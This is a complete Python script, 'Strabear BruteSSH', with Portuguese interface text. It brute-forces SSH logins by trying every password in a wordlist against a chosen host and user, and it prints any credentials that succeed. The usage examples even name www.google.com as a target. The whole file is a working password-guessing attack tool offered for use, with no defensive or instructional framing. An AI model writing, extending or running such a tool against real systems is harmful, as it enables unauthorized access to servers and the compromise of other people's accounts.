#!/usr/bin/python3
# -*- coding: utf-8 -*-
import paramiko, sys, os, socket
import getopt

global host
global username
global line
global input_file

line = "\n-----------------------------------------------------\n"

def usage():
        print ("			Strabear BruteSSH ")
        print ('			@@Version: 1.0')
        print ('			@@Created by Black Straby')
        print ('			@@Date: 7 jan 2017')
        print ('')
        print ("Usage: ./bruteSSH.py -t alvo -u username -w wordlist")
        print ('-t 	--target 	= Alvo')
        print ('-u 	--username	= Nome do usuario')
        print ('-w 	--wordlist 	= Lista de senhas pra testar')
        print ('-v 	 --version   	= Mostra a versão e encerra')
        print ('-h	 --help		= Menu de ajuda')
        print ('')
        print ('')
        print ("Examples: ")
        print ("bruteSSH.py  -t www.google.com  -u black -w wordlist.txt")
        print ("bruteSSH.py  -t 192.168.0.104 	-u root -w pass.txt")
        print ('')
        sys.exit(0)

def ssh_connect(password, code = 0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(host, port=22, username=username, password=password)
	except paramiko.AuthenticationException:
		#print("[-] Authentication Failed..")
		code = 1
	except socket.error as e:
		#print("[-] Conexao falhou.. Host Down")
		code = 2
	except KeyboardInterrupt:
	 	print("\n\n[*] Cancelado pelo Usuário.")
	 	sys.exit(3)

	ssh.close()
	return code


try:
    opts, args = getopt.getopt(sys.argv[1:], 't:u:w:h:v', ['target=', 'user=', 'wordlist=', 'version','help'])
except getopt.GetoptError:
	usage()
	sys.exit(2)

for opt, arg in opts:
	if opt in ('-h', '--help'):
		usage()
		sys.exit(2)
	elif opt in ('-t', '--target'):
		host = str(arg)
	elif opt in ('-u', '--username'):
		username = arg
	elif opt in ('-w', '--wordlist'):
		input_file = arg
	elif opt in ('-v', '--version'):
		print('Versao atual: 1.0')
		exit()
	else:
   		usage()
   		sys.exit(2)

print("\n\033[44mInicializado bruteforce..\033[0;0m \n")

input_file = open(input_file)
for i in input_file.readlines():
	password = i.strip("\n")
	try:
		resposta = ssh_connect(password)
			
		if resposta == 0:
			print('\033[32m %s[+] User: %s [+] Pass: %s  ==> Login Successful !!! <== %s \033[0;0m' %(line,username,password,line))
			sys.exit(0)

		elif resposta == 1:
			print("[-] User: %s [-] Pass: %s => Login Failed !!" %(username,password))
		elif resposta == 2:
			print("\033[31m[*] Connection Refused! by: %s \033[0;0m" % (host))
			sys.exit(2)

	except Exception as e:
		print(e)
		pass

input_file.close()	        
